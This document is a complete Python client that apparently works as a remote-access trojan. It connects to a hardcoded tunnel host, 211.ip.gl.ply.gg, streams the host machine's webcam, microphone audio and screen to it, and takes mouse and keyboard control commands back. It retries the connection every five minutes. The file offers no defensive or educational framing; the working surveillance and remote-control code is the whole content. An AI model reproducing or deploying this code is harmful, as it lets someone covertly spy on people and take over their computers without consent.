import socket
import cv2
import numpy as np
import pyaudio
import struct
import time
import threading
import json
from mss import mss
from pynput.mouse import Controller as MouseController, Button
from pynput.keyboard import Controller as KeyboardController, Key

# --- Configuration ---
SERVER_HOST = "211.ip.gl.ply.gg"
STREAM_PORT = 40815
RECONNECT_DELAY = 300  # 5 minutes

# --- V2 Protocol Tags ---
TAG_WEBCAM_FRAME = 0x01
TAG_AUDIO_CHUNK = 0x02
TAG_SCREEN_FRAME = 0x03
TAG_CONTROL_CMD = 0x04
TAG_V1_BATCH = 0x10

# --- Media Configuration ---
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 48000
FPS = 20.0
CHUNK = int(RATE / FPS)
BATCH_SECONDS = 5

# --- Global State ---
stop_event = threading.Event()

def pack_v2_chunk(tag, data):
    return struct.pack('>BL', tag, len(data)) + data

def webcam_audio_sender_v1(sock):
    """Captures and sends webcam/audio in V1 batch mode for recording."""
    p = pyaudio.PyAudio()
    audio_stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
    cap = cv2.VideoCapture(0)
    
    print("[V1 Batch Mode] Starting capture...")
    while not stop_event.is_set():
        try:
            batch_buffer = []
            start_time = time.time()

            # Collect for BATCH_SECONDS
            while time.time() - start_time < BATCH_SECONDS:
                ret, frame = cap.read()
                if not ret:
                    time.sleep(0.05)
                    continue
                
                audio_data = audio_stream.read(CHUNK)
                result, frame_encoded = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 75])
                video_data = frame_encoded.tobytes()
                batch_buffer.append((video_data, audio_data))
            
            # Serialize and send the batch
            if batch_buffer:
                payload = b''
                # Pack number of frames in the batch
                payload += struct.pack(">I", len(batch_buffer))
                for video_data, audio_data in batch_buffer:
                    # Pack lengths of each data chunk
                    payload += struct.pack(">LL", len(video_data), len(audio_data))
                    # Append data
                    payload += video_data
                    payload += audio_data
                
                # Send the final batch packet
                sock.sendall(pack_v2_chunk(TAG_V1_BATCH, payload))
                print(f"[V1 Batch Mode] Sent a batch of {len(batch_buffer)} frames.")

        except (BrokenPipeError, ConnectionResetError) as e:
            print(f"[V1 Batch Mode] Connection lost: {e}")
            stop_event.set()
            break
        except Exception as e:
            print(f"[V1 Batch Mode] An error occurred: {e}")
            time.sleep(1)

    cap.release()
    audio_stream.stop_stream()
    audio_stream.close()
    p.terminate()
    print("[V1 Batch Mode] Stopped.")

def webcam_audio_sender_v2(sock):
    """Captures and sends webcam/audio in V2 real-time mode for streaming."""
    p = pyaudio.PyAudio()
    audio_stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
    cap = cv2.VideoCapture(0)
    frame_time = 1.0 / FPS

    print("[V2 Stream Mode] Starting stream...")
    while not stop_event.is_set():
        try:
            start_time = time.time()
            
            ret, frame = cap.read()
            if not ret:
                time.sleep(0.05)
                continue
            
            audio_data = audio_stream.read(CHUNK)
            result, frame_encoded = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 75])
            video_data = frame_encoded.tobytes()

            webcam_chunk = pack_v2_chunk(TAG_WEBCAM_FRAME, video_data)
            audio_chunk = pack_v2_chunk(TAG_AUDIO_CHUNK, audio_data)
            sock.sendall(webcam_chunk + audio_chunk)

            elapsed_time = time.time() - start_time
            sleep_time = frame_time - elapsed_time
            if sleep_time > 0:
                time.sleep(sleep_time)

        except (BrokenPipeError, ConnectionResetError) as e:
            print(f"[V2 Stream Mode] Connection lost: {e}")
            stop_event.set()
            break
        except Exception as e:
            print(f"[V2 Stream Mode] An error occurred: {e}")
            time.sleep(1)

    cap.release()
    audio_stream.stop_stream()
    audio_stream.close()
    p.terminate()
    print("[V2 Stream Mode] Stopped.")

def screen_sender(sock):
    """(V2 only) Captures and sends the screen."""
    frame_time = 1.0 / FPS
    print("[Screen Thread] Starting stream...")
    with mss() as sct:
        while not stop_event.is_set():
            try:
                start_time = time.time()
                monitor = sct.monitors[1]
                sct_img = sct.grab(monitor)
                frame = cv2.cvtColor(np.array(sct_img), cv2.COLOR_RGB2BGR)

                result, frame_encoded = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 90])
                video_data = frame_encoded.tobytes()

                chunk = pack_v2_chunk(TAG_SCREEN_FRAME, video_data)
                sock.sendall(chunk)

                elapsed_time = time.time() - start_time
                sleep_time = frame_time - elapsed_time
                if sleep_time > 0:
                    time.sleep(sleep_time)

            except (BrokenPipeError, ConnectionResetError) as e:
                print(f"[Screen Thread] Connection lost: {e}")
                stop_event.set()
                break
            except Exception as e:
                print(f"[Screen Thread] An error occurred: {e}")
                time.sleep(1)
    print("[Screen Thread] Stopped.")

def control_receiver(sock):
    """(V2 only) Receives and executes remote control commands."""
    mouse = MouseController()
    keyboard = KeyboardController()
    print("[Control Thread] Listening for commands...")
    while not stop_event.is_set():
        try:
            header_data = sock.recv(5)
            if not header_data: break
            tag, length = struct.unpack('>BL', header_data)

            if tag == TAG_CONTROL_CMD:
                cmd_data = b''
                while len(cmd_data) < length:
                    cmd_data += sock.recv(length - len(cmd_data))
                cmd = json.loads(cmd_data.decode('utf-8'))

                if cmd['type'] == 'mouse_move': mouse.position = (cmd['x'], cmd['y'])
                elif cmd['type'] == 'mouse_press': mouse.press(Button.left if cmd['button'] == 'left' else Button.right)
                elif cmd['type'] == 'mouse_release': mouse.release(Button.left if cmd['button'] == 'left' else Button.right)
                elif cmd['type'] == 'key_press': keyboard.press(getattr(Key, cmd['key'], cmd['key']))
                elif cmd['type'] == 'key_release': keyboard.release(getattr(Key, cmd['key'], cmd['key']))

        except (BrokenPipeError, ConnectionResetError):
            print("[Control Thread] Connection lost.")
            stop_event.set()
            break
        except Exception as e:
            print(f"[Control Thread] Error receiving command: {e}")
    print("[Control Thread] Stopped.")

def main():
    while True:
        client_socket = None
        threads = []
        stop_event.clear()

        try:
            print(f"Attempting to connect to {SERVER_HOST}:{STREAM_PORT}...")
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.settimeout(5.0)
            client_socket.connect((SERVER_HOST, STREAM_PORT))
            
            v2_protocol = False
            try:
                print("Attempting V2 handshake...")
                client_socket.sendall(b'HELLO_V2')
                response = client_socket.recv(1024)
                if response == b'OK_V2':
                    v2_protocol = True
                    print("V2 handshake successful. Starting dual-stream mode.")
                else:
                    print("V2 handshake failed. Falling back to V1 (batch) protocol.")
            except socket.timeout:
                print("Handshake timed out. Assuming V1 (batch) server.")
            except Exception as e:
                print(f"Handshake failed: {e}. Assuming V1 (batch) server.")
            
            client_socket.settimeout(None)

            if v2_protocol:
                threads.append(threading.Thread(target=webcam_audio_sender_v2, args=(client_socket,)))
                threads.append(threading.Thread(target=screen_sender, args=(client_socket,)))
                threads.append(threading.Thread(target=control_receiver, args=(client_socket,)))
            else:
                threads.append(threading.Thread(target=webcam_audio_sender_v1, args=(client_socket,)))

            for t in threads:
                t.start()
            
            while not stop_event.is_set():
                time.sleep(1)

        except ConnectionRefusedError:
            print("Connection refused. Server may be down or busy.")
        except KeyboardInterrupt:
            print("\nStopping client by user command.")
            stop_event.set()
            break
        except Exception as e:
            print(f"An unexpected error occurred in main: {e}")
        finally:
            print("Closing connection and cleaning up threads...")
            stop_event.set()
            if client_socket:
                client_socket.close()
            for t in threads:
                t.join()
            
            # Check if we should break the main loop
            should_exit = False
            try:
                # Re-check for KeyboardInterrupt during sleep
                if isinstance(e, KeyboardInterrupt):
                    should_exit = True
            except NameError:
                pass # e is not defined if connection was successful

            if should_exit:
                break
            else:
                print(f"Reconnecting in {RECONNECT_DELAY} seconds...")
                try:
                    time.sleep(RECONNECT_DELAY)
                except KeyboardInterrupt:
                    print("\nStopping client during wait.")
                    break

if __name__ == "__main__":
    main()